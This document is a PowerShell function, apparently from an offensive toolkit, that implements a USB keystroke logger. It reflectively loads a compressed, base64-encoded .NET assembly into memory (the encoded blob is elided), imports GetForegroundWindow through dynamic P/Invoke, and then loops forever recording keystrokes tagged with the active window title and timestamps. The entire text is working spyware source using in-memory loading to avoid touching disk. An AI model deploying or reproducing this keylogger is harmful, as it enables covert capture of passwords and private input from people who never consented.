function Get-USBKeystrokes 
{
    $RemoteScriptBlock = {
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $CShardDLLBytes
    )
    $DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($CShardDLLBytes),[IO.Compression.CompressionMode]::Decompress)
    $UncompressedFileBytes = New-Object Byte[](624640)
    $DeflatedStream.Read($UncompressedFileBytes, 0, 624640) | Out-Null
    [Reflection.Assembly]::Load($UncompressedFileBytes)
    "`nETW library loaded`n"
    }
$EncodedCompressedFile = @'
jHgFWFVN1/ahDt3dJQ3S3SEd0t2dh...2OPq/dW0ZvKe1I2BYzn/0z9IvwA= # NOTE: The actual 802128-character Base64 string omitted for readability.
'@
    Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($EncodedCompressedFile)
    [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null
    $ImportDll = ""
    try
    {
        $ImportDll = [User32]
    }
    catch
    {
        $DynAssembly = New-Object System.Reflection.AssemblyName('Win32Lib')
        $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Lib', $False)
        $TypeBuilder = $ModuleBuilder.DefineType('User32', 'Public, Class')
        $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
        $FieldArray = [Reflection.FieldInfo[]] @(
            [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
            [Runtime.InteropServices.DllImportAttribute].GetField('ExactSpelling'),
            [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'),
            [Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig'),
            [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'),
            [Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
        )
        $PInvokeMethod = $TypeBuilder.DefineMethod('GetForegroundWindow', 'Public, Static', [IntPtr], [Type[]] @())
        $FieldValueArray = [Object[]] @(
            'GetForegroundWindow',
            $True,
            $False,
            $True,
            [Runtime.InteropServices.CallingConvention]::Winapi,
            [Runtime.InteropServices.CharSet]::Auto 
        )
        $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
        $PInvokeMethod.SetCustomAttribute($CustomAttribute)
        $ImportDll = $TypeBuilder.CreateType()
    }
    "User32 functions imported.`n"
    try
    {
        $ETWLogger = New-Object Etwkeylogger.UsbEventSource
        $ETWLogger.startkeyLog()
        $LastWindowTitle = ""
        $key = ""
        while($true)
        {
            if ($ETWLogger.keysPressed.Count -ne 0)   
            {
                $TopWindow = $ImportDll::GetForegroundWindow()
                $WindowTitle = (Get-Process | Where-Object { $_.MainWindowHandle -eq $TopWindow }).MainWindowTitle
                $WindowTitle = $WindowTitle -replace "\s*-\s([0-9]){2}/([0-9]){2}/([0-9]){4}:([0-9]){2}:([0-9]){2}:([0-9]){2}:([0-9]){2}", ""
                if ($WindowTitle -ne $LastWindowTitle -and $WindowTitle -ne "")
                {
                    $LastWindowTitle = $WindowTitle
                }
                $c = $ETWLogger.keysPressed.Dequeue()         
                $c = $c -replace "([0-9A-Z]{2}\s*){8}\t\t", ""
                if ($c -eq "[RET]")
                {
                    $TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss)
                    "`n[=== $LastWindowTitle - $TimeStamp ===]`n$key`n"
                    $key = ""
                }
                elseIf( $c -eq "[SPACE]")
                {
                    $key += " "
                }
                elseIf($key.length -gt 100)
                {
                    $TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss)
                    "`n[=== $LastWindowTitle - $TimeStamp ===]`n$key`n"
                    $key = ""   
                }
                else
                {
                    $key += $c
                }
            }
            Start-Sleep -Milliseconds 100
        }
    }
    catch
    {
        "Exception during run: $($_.Exception.Message)`n"
    }
}